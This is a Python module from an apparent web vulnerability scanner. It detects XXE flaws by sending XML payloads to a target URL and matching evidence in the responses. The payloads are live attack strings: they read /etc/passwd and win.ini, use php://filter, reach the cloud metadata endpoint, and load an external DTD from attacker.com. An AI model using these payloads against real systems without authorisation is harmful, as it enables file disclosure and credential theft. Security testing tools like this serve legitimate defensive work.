"""
AnarkisHunter — vuln_xxe.py
=============================
XXE (XML External Entity) detector.
Inject XML payload yang mendefinisikan external entity,
cek apakah konten file system ter-include di response.

Usage standalone:
    python modules/vuln/vuln_xxe.py --url "http://target.local/xml-endpoint" --method POST
"""

import sys
import re
import argparse
from pathlib import Path
from typing import Dict, List

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from modules.utils.utils_request import HTTPClient, normalize_url
from modules.utils.report import ScanResult


XXE_PAYLOADS = [
    # Basic file disclosure
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
    # Windows
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
<root><data>&xxe;</data></root>""",
    # PHP filter
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>""",
    # SSRF via XXE
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",
    # Out-of-band (memerlukan kontrol attacker.com)
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<root></root>""",
]

EVIDENCE_PATTERNS = [
    re.compile(r"root:[x*]?:0:0:"),
    re.compile(r"\[fonts\]|\[extensions\]", re.I),
    re.compile(r"PD9waHA"),  # base64 of <?php
    re.compile(r"instance-id|computeMetadata"),
]


def run_xxe_scan(
    target: str,
    method: str = "POST",
    payloads: List[str] = None,
    content_type: str = "application/xml",
    timeout: int = 12,
) -> Dict:
    url = normalize_url(target)
    payloads = payloads or XXE_PAYLOADS
    result = {
        "target": url,
        "method": method,
        "total_payloads": len(payloads),
        "vulnerabilities": [],
        "error": None,
    }

    try:
        with HTTPClient(timeout=timeout) as client:
            for idx, payload in enumerate(payloads):
                headers = {"Content-Type": content_type}
                if method.upper() == "POST":
                    resp = client.post(url, data=payload, headers=headers)
                elif method.upper() == "PUT":
                    resp = client.put(url, data=payload, headers=headers)
                else:
                    resp = client._request(method, url, data=payload, headers=headers)
                if not resp:
                    continue

                text = resp.text[:8000]
                matched = None
                for pat in EVIDENCE_PATTERNS:
                    m = pat.search(text)
                    if m:
                        matched = m.group(0)[:200]
                        break

                if matched:
                    result["vulnerabilities"].append({
                        "payload_idx": idx,
                        "payload": payload[:300],
                        "type": "XXE — File/SSRF disclosure",
                        "evidence": matched,
                        "status": resp.status_code,
                        "url": url,
                    })

    except Exception as e:
        result["error"] = str(e)

    return result


def analyze_xxe_findings(data: Dict) -> List[ScanResult]:
    findings = []
    for v in data.get("vulnerabilities", []):
        findings.append(ScanResult(
            title="XXE Vulnerability Detected",
            severity="CRITICAL",
            description="XML parser memproses external entity — bisa baca file lokal & SSRF",
            url=v["url"],
            evidence=v["evidence"],
            payload=v["payload"][:200],
            recommendation=(
                "Disable XML external entities di parser; "
                "gunakan defusedxml di Python; "
                "set XMLConstants.FEATURE_SECURE_PROCESSING di Java; "
                "set LIBXML_NOENT off di PHP"
            ),
            owasp="A05",
            module="vuln_xxe",
        ))
    return findings


# ─── Standalone ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    from rich.console import Console

    console = Console()
    parser = argparse.ArgumentParser(description="AnarkisHunter — XXE Detector")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--method", default="POST")
    parser.add_argument("--content-type", default="application/xml")
    args = parser.parse_args()

    console.print(f"\n[red]📄 XXE Scan: [bold]{args.url}[/bold] [{args.method}][/red]\n")
    data = run_xxe_scan(args.url, args.method, content_type=args.content_type)

    if data.get("error"):
        console.print(f"[red]Error: {data['error']}[/red]")
        sys.exit(1)

    console.print(f"[red]Vulns:[/red] {len(data['vulnerabilities'])}\n")
    for v in data["vulnerabilities"]:
        console.print(f"[red][XXE][/red] {v['type']}")
        console.print(f"  Evidence: {v['evidence']}")
        console.print(f"  Payload: {v['payload'][:200]}\n")
